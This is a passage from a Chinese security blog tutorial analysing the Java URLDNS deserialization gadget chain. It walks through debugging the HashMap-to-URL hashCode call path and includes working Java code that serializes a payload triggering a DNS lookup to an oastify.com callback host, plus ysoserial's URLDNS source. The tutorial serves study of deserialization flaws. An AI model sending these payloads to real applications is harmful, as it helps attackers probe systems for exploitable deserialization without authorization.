+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/urldns/9.png" alt="9"></p>
+<p>一般到这里就OK了，如果真想继续跟下去就会到<code>InetAddress</code>类中方法才触发：</p>
+<p><code>getAddressesFromNameService-&gt;nameService.lookupAllHostAddr(host)</code></p>
+<p>我们可以看下<code>getByName</code>的官方介绍：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/urldns/10.png" alt="10"></p>
+<p>给一个host&rsquo;s name返回IP地址。</p>
+<p>那么整个的过程如下：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">HashMap.put() -&gt; HashMap.hash() -&gt; java.net.URL.hashCode() -&gt; URLStreamHandler.hashCode() -&gt; URLStreamHandler.getHostAddress() -&gt; InetAddress.getByName()
+</span></span></code></pre></div><p>我们可以知道执行上面的代码进行序列化的时候也会触发DNS请求，那么我们怎么样才可以不触发从而进行序列化呢？</p>
+<p>我们的关键点还是在HashMap中的hashCode方法中，只要我们设置hashCode的值不为-1即可。</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/urldns/5.png" alt="5"></p>
+<p>我们知道URL里面的hashCode值是私有的，我们不能通过对象直接写入内容，但是可以使用Java的<code>反射</code>特性。</p>
+<p>我们在原有的基础上加入下面的内容：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.io.FileOutputStream</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.io.ObjectOutputStream</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.lang.reflect.Field</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.net.URL</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.util.HashMap</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">UrlDnsExp</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span><span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">HashMap</span><span class="o">&lt;</span><span class="n">URL</span><span class="o">,</span> <span class="n">String</span><span class="o">&gt;</span> <span class="n">obj</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">&lt;</span><span class="n">URL</span><span class="o">,</span> <span class="n">String</span><span class="o">&gt;();</span>
+</span></span><span class="line"><span class="cl">        <span class="n">URL</span> <span class="n">url</span> <span class="o">=</span> <span class="k">new</span> <span class="n">URL</span><span class="o">(</span><span class="s">&#34;http://hyji8wgb7eebb7rimnzf84prfil9mxb.oastify.com&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">Class</span> <span class="n">clazz</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">&#34;java.net.URL&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">Field</span> <span class="n">field</span> <span class="o">=</span> <span class="n">clazz</span><span class="o">.</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;hashCode&#34;</span><span class="o">);;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">field</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">field</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">url</span><span class="o">,</span><span class="n">1234</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">obj</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">url</span><span class="o">,</span><span class="s">&#34;qwer&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1">//序列化
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">FileOutputStream</span> <span class="n">fo</span> <span class="o">=</span> <span class="k">new</span> <span class="n">FileOutputStream</span><span class="o">(</span><span class="s">&#34;dns.ser&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">ObjectOutputStream</span> <span class="n">objectOutputStream</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectOutputStream</span><span class="o">(</span><span class="n">fo</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">objectOutputStream</span><span class="o">.</span><span class="na">writeObject</span><span class="o">(</span><span class="n">obj</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">objectOutputStream</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span></code></pre></div><p>反射这块内容相信大家已经很熟悉了，获取私有属性的时候要使用<code>getDeclaredField</code>方法，还需要<code>setAccessible</code>来设置访问权限。</p>
+<p>我们只要设置URL类中的hashCode为-1即可，再执行的时候我们已经发现不再触发DNS请求了。</p>
+<blockquote>
+<p>当中触发DNS请求为什么选URL类，因为URL类是可被序列化的，HashMap也是implements了Serializable接口。</p>
+</blockquote>
+<h2 id="反序列化分析">反序列化分析</h2>
+<p>经过上面的过程分析之后大家估计都会疑惑，为什么要用<code>HashMap</code>这个类呢？</p>
+<p>这是一个非常好的问题，初学者都会有这样的疑惑。</p>
+<p>大家有没有记得我们在第一章的反序列化中提到过：</p>
+<p><code>能被序列化和反序列化的类需要实现Serializable接口，正好HashMap实现了这个接口。</code></p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/urldns/11.png" alt="11"></p>
+<p>并且<code>HashMap</code>类也重写了readObject方法。</p>
+<p>我们现在先来写一个反序列化的代码：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.io.FileInputStream</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.io.ObjectInputStream</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">UrlDnsRead</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span><span class="o">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">FileInputStream</span> <span class="n">fis</span> <span class="o">=</span> <span class="k">new</span> <span class="n">FileInputStream</span><span class="o">(</span><span class="s">&#34;dns.ser&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">ObjectInputStream</span> <span class="n">ois</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectInputStream</span><span class="o">(</span><span class="n">fis</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">ois</span><span class="o">.</span><span class="na">readObject</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span></code></pre></div><p>我们执行之后发现并没有请求，我们可以在URL类的hashCode方法中下一个断点进行调试：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/urldns/12.png" alt="12"></p>
+<p>有人会发现执行到<code>handler</code>的时候会直接跳到<code>URLStreamHandler</code>的抽象类当中，因为在URL类中的215行这个<code>handler</code>是属于URLStreamHandler类的。</p>
+<p>我们可以发现现在的hashCode的值是我们在序列化的时候设置的值。</p>
+<p>因为我们在序列化的时候为了不请求dns，设置hashCode不为-1了，当hashCode为-1的时候才能触发dns请求。</p>
+<p>我们可以使用SerializationDumper查看序列化后的值是否被写进去：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">➜  java -jar SerializationDumper-v1.13.jar -r dns.ser
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">STREAM_MAGIC - 0xac ed
+</span></span><span class="line"><span class="cl">STREAM_VERSION - 0x00 05
+</span></span><span class="line"><span class="cl">....
+</span></span><span class="line"><span class="cl">....
+</span></span><span class="line"><span class="cl">....
+</span></span><span class="line"><span class="cl">              superClassDesc
+</span></span><span class="line"><span class="cl">                TC_NULL - 0x70
+</span></span><span class="line"><span class="cl">            newHandle 0x00 7e 00 04
+</span></span><span class="line"><span class="cl">            classdata
+</span></span><span class="line"><span class="cl">              java.net.URL
+</span></span><span class="line"><span class="cl">                values
+</span></span><span class="line"><span class="cl">                  hashCode
+</span></span><span class="line"><span class="cl">                    (int)1234 - 0x00 00 04 d2 //这里就是设置的数值
+</span></span><span class="line"><span class="cl">                  port
+</span></span><span class="line"><span class="cl">                    (int)-1 - 0xff ff ff ff
+</span></span><span class="line"><span class="cl">                  authority
+</span></span><span class="line"><span class="cl">                    (object)
+</span></span><span class="line"><span class="cl">                      TC_STRING - 0x74
+</span></span><span class="line"><span class="cl">                        newHandle 0x00 7e 00 05
+</span></span><span class="line"><span class="cl">                        Length - 42 - 0x00 2a
+</span></span><span class="line"><span class="cl">                        Value - 6qxyz8op2m5bp7jw5gf83vpgq7wxkm.oastify.com - 0x367178797a386f70326d356270376a773567663833767067713777786b6d2e6f6173746966792e636f6d
+</span></span><span class="line"><span class="cl">                  file
+</span></span></code></pre></div><p>怎么才能在反序列化的时候触发而在序列化的时候不触发呢？在序列化的时候加上这一句即可：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">field</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">url</span><span class="o">,-</span><span class="n">1</span><span class="o">);</span>
+</span></span></code></pre></div><p>那么我们序列化的整段代码就变为：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/urldns/13.png" alt="13"></p>
+<p>我们再次执行反序列化的时候就看到DNS请求了：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/urldns/14.png" alt="14"></p>
+<p>我们debug一下反序列化的过程，先在HashMap中重写readObject方法中下断点，我们往下走可以看到putVal中的hash方法：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/urldns/15.png" alt="15"></p>
+<p>再往下走是否似曾相识呢：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/urldns/16.png" alt="16"></p>
+<p>Key是URL对象，所以会触发URL里面的hashCode方法：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/urldns/17.png" alt="17"></p>
+<p>继续往下走就跟我们序列化的是一样的：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/urldns/18.png" alt="18"></p>
+<p>所以整个流程如下：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">HashMap</span><span class="o">.</span><span class="na">readObject</span><span class="o">()</span> <span class="o">-&gt;</span> <span class="n">HashMap</span><span class="o">.</span><span class="na">putVal</span><span class="o">()-&gt;</span><span class="n">HashMap</span><span class="o">.</span><span class="na">hash</span><span class="o">()-&gt;</span><span class="n">URL</span><span class="o">.</span><span class="na">hashcode</span><span class="o">()-&gt;</span><span class="n">URLStreamHandler</span><span class="o">().</span><span class="na">hashCode</span><span class="o">().</span><span class="na">getHostAddress</span><span class="o">-&gt;</span><span class="n">URLStreamHandler</span><span class="o">().</span><span class="na">hashCode</span><span class="o">().</span><span class="na">getHostAddress</span><span class="o">.</span><span class="na">getByName</span><span class="o">()</span>
+</span></span></code></pre></div><h2 id="ysoserial之urldns分析">ysoserial之URLDNS分析</h2>
+<p>我们可以看下ysoserial中的<a href="https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java">URLDNS.java</a>是怎么写的：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span> <span class="nn">ysoserial.payloads</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.io.IOException</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.net.InetAddress</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.net.URLConnection</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.net.URLStreamHandler</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.util.HashMap</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.net.URL</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">ysoserial.payloads.annotation.Authors</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">ysoserial.payloads.annotation.Dependencies</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">ysoserial.payloads.annotation.PayloadTest</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">ysoserial.payloads.util.PayloadRunner</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">ysoserial.payloads.util.Reflections</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@SuppressWarnings</span><span class="o">({</span> <span class="s">&#34;rawtypes&#34;</span><span class="o">,</span> <span class="s">&#34;unchecked&#34;</span> <span class="o">})</span>
+</span></span><span class="line"><span class="cl"><span class="nd">@PayloadTest</span><span class="o">(</span><span class="n">skip</span> <span class="o">=</span> <span class="s">&#34;true&#34;</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="nd">@Dependencies</span><span class="o">()</span>
+</span></span><span class="line"><span class="cl"><span class="nd">@Authors</span><span class="o">({</span> <span class="n">Authors</span><span class="o">.</span><span class="na">GEBL</span> <span class="o">})</span>
+</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">URLDNS</span> <span class="kd">implements</span> <span class="n">ObjectPayload</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">&gt;</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="kd">public</span> <span class="n">Object</span> <span class="nf">getObject</span><span class="o">(</span><span class="kd">final</span> <span class="n">String</span> <span class="n">url</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                <span class="c1">//Avoid DNS resolution during payload creation
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="c1">//Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="n">URLStreamHandler</span> <span class="n">handler</span> <span class="o">=</span> <span class="k">new</span> <span class="n">SilentURLStreamHandler</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                <span class="n">HashMap</span> <span class="n">ht</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">();</span> <span class="c1">// HashMap that will contain the URL
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="n">URL</span> <span class="n">u</span> <span class="o">=</span> <span class="k">new</span> <span class="n">URL</span><span class="o">(</span><span class="kc">null</span><span class="o">,</span> <span class="n">url</span><span class="o">,</span> <span class="n">handler</span><span class="o">);</span> <span class="c1">// URL to use as the Key
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="n">ht</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">u</span><span class="o">,</span> <span class="n">url</span><span class="o">);</span> <span class="c1">//The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">                <span class="n">Reflections</span><span class="o">.</span><span class="na">setFieldValue</span><span class="o">(</span><span class="n">u</span><span class="o">,</span> <span class="s">&#34;hashCode&#34;</span><span class="o">,</span> <span class="o">-</span><span class="n">1</span><span class="o">);</span> <span class="c1">// During the put above, the URL&#39;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="n">ht</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="kd">final</span> <span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">                <span class="n">PayloadRunner</span><span class="o">.</span><span class="na">run</span><span class="o">(</span><span class="n">URLDNS</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">args</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="kd">static</span> <span class="kd">class</span> <span class="nc">SilentURLStreamHandler</span> <span class="kd">extends</span> <span class="n">URLStreamHandler</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                <span class="kd">protected</span> <span class="n">URLConnection</span> <span class="nf">openConnection</span><span class="o">(</span><span class="n">URL</span> <span class="n">u</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">                        <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">                <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                <span class="kd">protected</span> <span class="kd">synchronized</span> <span class="n">InetAddress</span> <span class="nf">getHostAddress</span><span class="o">(</span><span class="n">URL</span> <span class="n">u</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">                        <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">                <span class="o">}</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span></code></pre></div><p>其实跟我们上面序列化的部分是大同小异的，只是它把下面这句：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">field</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">url</span><span class="o">,</span><span class="n">1234</span><span class="o">);</span>
+</span></span></code></pre></div><p>换成了下面这段，重写了SilentURLStreamHandler方法：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"> <span class="kd">static</span> <span class="kd">class</span> <span class="nc">SilentURLStreamHandler</span> <span class="kd">extends</span> <span class="n">URLStreamHandler</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                <span class="kd">protected</span> <span class="n">URLConnection</span> <span class="nf">openConnection</span><span class="o">(</span><span class="n">URL</span> <span class="n">u</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">                        <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">                <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                <span class="kd">protected</span> <span class="kd">synchronized</span> <span class="n">InetAddress</span> <span class="nf">getHostAddress</span><span class="o">(</span><span class="n">URL</span> <span class="n">u</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">                        <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">                <span class="o">}</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span></code></pre></div><h1 id="0x03-总结">0x03 总结</h1>
+<p>整个过程其实很简单，因为相比于CC链来说确实是非常简单的一条链了，笔者文笔不是很好，大家如有建议可以在评论区留下宝贵的意见。</p>
+<h1 id="0x04-参考">0x04 参考</h1>
+<p><a href="https://github.com/frohoff/ysoserial">https://github.com/frohoff/ysoserial</a></p>
+<p><a href="https://yoga7xm.top/2019/08/17/urldns/">https://yoga7xm.top/2019/08/17/urldns/</a></p>
+
+
+            <hr class="bg-gray-300 mt-8">
+
+            
+
+            
+<div class="border-l-4 border-red-400 mx-auto text-gray-500">
+    <div class="copyright">
+        <ul class="list-none">
+            <li>
+                <strong>原文作者：</strong>
+                <a rel="author" href="https://xxe.icu">F0rmat</a>
+            </li>
+            <li style="word-break:break-all">
+                <strong>原文链接：</strong>
+                <a href="https://xxe.icu/urldns_chain_analysis.html">https://xxe.icu/urldns_chain_analysis.html</a>
+            </li>
+            <li>
+                <strong>版权声明：</strong>本作品采用
+                <a rel="license" href="https://creativecommons.org/licenses/by-nc/4.0/deed.zh">署名 - 非商业性使用 4.0 国际 (CC BY-NC 4.0)</a>进行许可，非商业转载请注明出处（作者，原文链接），商业转载请联系作者获得授权。
+            </li>
+        </ul>
+    </div>
+ 
+</div>
+
+
+        </div>
+
+        
+        
+
+         
+        
+            <p class="text-gray-500 text-sm text-right pt-1">
+                <span id="busuanzi_container_page_pv">
+                    本文有 <span id="busuanzi_value_page_pv"></span> 次阅读
+                </span>
+            </p>
+        
+
+    </div>
+    
+
+    
+    <hr class="bg-gray-300 dark:bg-gray-300 my-10">
+
+    
+        
+        
+        <div class="comments">
+            <div id="disqus_thread"></div>
+    <script type="text/javascript">
+    (function() {
+      
+      
+      if (window.location.hostname === 'localhost') return;
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      var disqus_shortname = 'forecho-blog';
+      dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+  
+
+  
+    <script src="https://utteranc.es/client.js"
+            repo="Secd0g/comment"
+            issue-term="pathname"
+            theme="github-light"
+            crossorigin="anonymous"
+            async>
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="https://github.com/utterance">comments powered by utterances.</a></noscript>
+
+  
+        </div>
+
+        <div class="related my-5">
+            
+
+
+<div class="p-8 mt-6 lg:mt-0 rounded shadow bg-white dark:bg-gray-800">
+    <h2 class="font-sans font-bold break-normal text-gray-700 px-2 pb-3 text-xl dark:text-gray-300">相关文章</h2>
+    
+    <li><a href="/python_separation_to_antivirus.html" class="underline text-yellow-600">免杀技术- Python分离免杀</a></li>
+    
+    <li><a href="/sdl.html" class="underline text-yellow-600">SDL(安全开发生命周期)</a></li>
+    
+    <li><a href="/using_bloodhound_under_macos.html" class="underline text-yellow-600">域渗透-MacOS下的BloodHound攻击</a></li>
+    
+    <li><a href="/ad_delegation.html" class="underline text-yellow-600">域渗透-委派攻击原理与实战</a></li>
+    
+    <li><a href="/ad_ptt.html" class="underline text-yellow-600">域渗透-票据传递攻击（Pass the Ticket）</a></li>
+    
+</div>
+
+        </div>
+
+    
+
+</section>
+
+
+<div class="hidden xl:text-sm xl:block xl:w-1/4 xl:px-6 ">
+
+    <div class="lg:w-full mx-auto items-center justify-between">
+    <div class="bg-white shadow rounded overflow-hidden dark:bg-gray-800">
+        <div class="bg-cover mx-auto w-32 h-32 mt-5 rounded-full" style="background-image: url('https://avatars.githubusercontent.com/u/16066632?v=4')"> </div>
+        
+        <div class="p-4">
+            <p class="text-2xl text-center pb-2">F0rmat</p>
+            <p class="text-sm text-center text-gray-700 dark:text-gray-300">专注于信息安全、内网渗透、红队攻防</p>
+        </div>
+        <div class="flex p-4 border-t text-sm border-gray-300 text-gray-700 dark:text-gray-300">
+            <div class="flex-1 border-r border-gray-600">
+                <p class="text-center">
+                    <span class="font-bold ">
+                        85
+                    </span>
+                    文章
+                </p>
+            </div>
+            <div class="flex-1 text-center">
+                <p class="text-center">
+                    <span class="font-bold">
+                        
+                            60
+                        
+                    </span>
+                    标签
+                </p>
+            </div>
+        </div>
+        <div class="px-4 pb-4 border-t border-gray-300 dark:text-gray-200">
+            <div class="mt-6 pb-16 lg:pb-0 w-4/5 lg:w-full mx-auto flex flex-wrap items-center  text-gray-500">
+                
+                <a href="//github.com/Secd0g" class="hover:text-gray-900 dark:hover:text-gray-100 p-1 text-2xl" target="_blank" title="GitHub"><i class="my-iconfont icon-social-github"></i></a>
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+                
+                <a href="//zhihu.com/people/F0rmat" class="hover:text-gray-900 dark:hover:text-gray-100 p-1 text-2xl" target="_blank" title="zhihu"><i><svg xmlns="http://www.w3.org/2000/svg" height="1em" viewBox="0 0 640 512"><style>svg{fill:#bac5d8}</style><path d="M170.54 148.13v217.54l23.43.01 7.71 26.37 42.01-26.37h49.53V148.13H170.54zm97.75 193.93h-27.94l-27.9 17.51-5.08-17.47-11.9-.04V171.75h72.82v170.31zm-118.46-94.39H97.5c1.74-27.1 2.2-51.59 2.2-73.46h51.16s1.97-22.56-8.58-22.31h-88.5c3.49-13.12 7.87-26.66 13.12-40.67 0 0-24.07 0-32.27 21.57-3.39 8.9-13.21 43.14-30.7 78.12 5.89-.64 25.37-1.18 36.84-22.21 2.11-5.89 2.51-6.66 5.14-14.53h28.87c0 10.5-1.2 66.88-1.68 73.44H20.83c-11.74 0-15.56 23.62-15.56 23.62h65.58C66.45 321.1 42.83 363.12 0 396.34c20.49 5.85 40.91-.93 51-9.9 0 0 22.98-20.9 35.59-69.25l53.96 64.94s7.91-26.89-1.24-39.99c-7.58-8.92-28.06-33.06-36.79-41.81L87.9 311.95c4.36-13.98 6.99-27.55 7.87-40.67h61.65s-.09-23.62-7.59-23.62v.01zm412.02-1.6c20.83-25.64 44.98-58.57 44.98-58.57s-18.65-14.8-27.38-4.06c-6 8.15-36.83 48.2-36.83 48.2l19.23 14.43zm-150.09-59.09c-9.01-8.25-25.91 2.13-25.91 2.13s39.52 55.04 41.12 57.45l19.46-13.73s-25.67-37.61-34.66-45.86h-.01zM640 258.35c-19.78 0-130.91.93-131.06.93v-101c4.81 0 12.42-.4 22.85-1.2 40.88-2.41 70.13-4 87.77-4.81 0 0 12.22-27.19-.59-33.44-3.07-1.18-23.17 4.58-23.17 4.58s-165.22 16.49-232.36 18.05c1.6 8.82 7.62 17.08 15.78 19.55 13.31 3.48 22.69 1.7 49.15.89 24.83-1.6 43.68-2.43 56.51-2.43v99.81H351.41s2.82 22.31 25.51 22.85h107.94v70.92c0 13.97-11.19 21.99-24.48 21.12-14.08.11-26.08-1.15-41.69-1.81 1.99 3.97 6.33 14.39 19.31 21.84 9.88 4.81 16.17 6.57 26.02 6.57 29.56 0 45.67-17.28 44.89-45.31v-73.32h122.36c9.68 0 8.7-23.78 8.7-23.78l.03-.01z"/></svg></i></a>
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+                <a href="/atom.xml" class="hover:text-gray-900 dark:hover:text-gray-100 p-1 text-2xl" target="_blank" title="RSS"><i class="my-iconfont icon-feed"></i></a>
+                
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+
+
+
+
+    <div class="flex flex-col justify-between sticky top-0 pt-12 pb-4 -mt-10 text-gray-600 dark:text-gray-400">
+        <div class="bg-white shadow rounded p-4 mt-5 dark:bg-gray-800">
+            
+<p class="text-base font-bold py-2 yg:pb-6 text-gray-700 dark:text-gray-300">文章目录</p>
+    <div class="sticky text-sm" style="top:6em;" id="menu-content">
+        <nav id="TableOfContents">
+  <ul>
+    <li><a href="#0x00-前言">0x00 前言</a></li>
+    <li><a href="#0x01-java序列化和反序列化">0x01 Java序列化和反序列化</a>
+      <ul>
+        <li><a href="#java序列化">Java序列化</a></li>
+        <li><a href="#java反序列化">Java反序列化</a></li>
+        <li><a href="#为什么需要序列化与反序列化">为什么需要序列化与反序列化？</a></li>
+      </ul>
+    </li>
+    <li><a href="#0x02-urldns链分析">0x02 URLDNS链分析</a>
+      <ul>
+        <li><a href="#序列化分析">序列化分析</a></li>
+        <li><a href="#反序列化分析">反序列化分析</a></li>
